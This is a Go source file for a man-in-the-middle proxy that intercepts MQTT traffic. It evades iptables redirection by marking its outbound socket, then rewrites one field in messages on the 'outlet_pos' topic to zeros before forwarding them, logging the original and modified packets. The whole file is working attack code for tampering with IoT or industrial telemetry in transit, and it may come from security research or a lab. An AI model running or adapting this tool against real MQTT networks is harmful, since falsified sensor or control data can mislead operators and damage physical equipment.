package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"syscall"
)

type mitm struct {
	c net.Conn
}

func (this *mitm) Read(p []byte) (int, error) {
	pub := make([]byte, 32*1024)

	n, err := this.c.Read(pub)
	if err != nil {
		return 0, err
	}

	targetTopic := []byte("outlet_pos")

	// 2nd byte is always len of rest of packet. Note that multiple packets may
	// end up being read as part of the same call to conn.Read.

	pos := 0

	for {
		// type bit
		tb := pos
		// size bit
		sb := pos + 1

		plen := int(pub[sb])

		// additional 2 bytes takes into account type bit and length bit
		stop := pos + plen + 2

		// additional 2 bytes takes into account type bit and length bit
		packet := pub[pos+2 : stop]

		if pub[tb] != 48 || !bytes.Contains(packet, targetTopic) {
			copy(p[pos:], pub[pos:stop])
		} else {
			fmt.Printf("ORIGINAL: %s\n", string(packet))

			topicLen := binary.BigEndian.Uint16(packet[0:2])
			// 2 bytes for topic length, 2 bytes for message identifier after topic
			startBit := 2 + topicLen + 2
			payload := packet[startBit:]

			tokens := strings.Split(string(payload), ", ")

			// MQTT messages sometimes have leading and trailing spaces (??)
			origLen := len(tokens[3])
			value := strings.TrimSpace(tokens[3])
			trimLen := len(value)

			tokens[3] = strings.Repeat("0", trimLen) + strings.Repeat(" ", origLen-trimLen)

			payload = []byte(strings.Join(tokens, ", "))

			copy(packet[startBit:], payload)

			fmt.Printf("MODIFIED: %s\n\n", string(packet))

			p[tb] = pub[tb]
			p[sb] = pub[sb]

			copy(p[pos+2:], packet)
		}

		pos = stop

		if pos >= n {
			break
		}
	}

	return n, nil
}

func main() {
	if len(os.Args) < 2 {
		panic("must provide listener config argument")
	}

	args := strings.Split(os.Args[1], ":")

	if len(args) != 4 {
		panic("invalid listener config provided")
	}

	var (
		local  = fmt.Sprintf("%s:%s", args[0], args[1])
		remote = fmt.Sprintf("%s:%s", args[2], args[3])
	)

	l, err := net.Listen("tcp", local)
	if err != nil {
		panic(err)
	}

	fmt.Printf("listening on %s\n", local)

	c, err := l.Accept()
	if err != nil {
		panic(err)
	}

	defer c.Close()

	fmt.Printf("client at %v connected\n", c.RemoteAddr())

	dialer := net.Dialer{}
	dialer.Control = func(_, _ string, c syscall.RawConn) error {
		return c.Control(func(fd uintptr) {
			// Mark outbound connection created by redirector so we can avoid
			// redirecting its connection via iptables.
			if err := syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_MARK, 45); err != nil {
				panic(err)
			}

			fmt.Println("outbound connection marked as 45")
		})
	}

	r, err := dialer.Dial("tcp", remote)
	if err != nil {
		panic(err)
	}

	defer r.Close()

	fmt.Printf("connected to %s\n", remote)

	go func() {
		m := &mitm{c}
		io.Copy(r, m)
	}()

	io.Copy(c, r)
}
